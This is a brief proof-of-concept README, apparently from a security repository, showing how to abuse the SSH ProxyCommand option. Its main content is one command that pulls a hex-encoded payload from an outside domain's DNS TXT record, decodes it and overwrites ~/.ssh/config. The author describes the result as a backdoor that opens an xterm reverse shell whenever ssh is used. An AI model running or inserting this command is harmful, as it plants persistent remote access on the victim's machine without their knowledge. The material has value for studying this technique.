Exploiting ssh config "option"
======================

"*...ProxyCommand, Specifies the command to use to connect to the server...*"

**Video**

<a href="http://www.youtube.com/watch?feature=player_embedded&v=byoCWf8SEZc" target="_blank"><img src="http://img.youtube.com/vi/byoCWf8SEZc/0.jpg" alt="SSH ProxyCommand abuse" width="480" height="360" border="10" /></a>

**Exploit**
```shell-session

dig txt ulissescastro.com +short | xxd -p -r > ~/.ssh/config

```

Using dig with prepared TXT dns record to show another way of deploy backdoor. Lame xterm revshell, btw, proof the point!

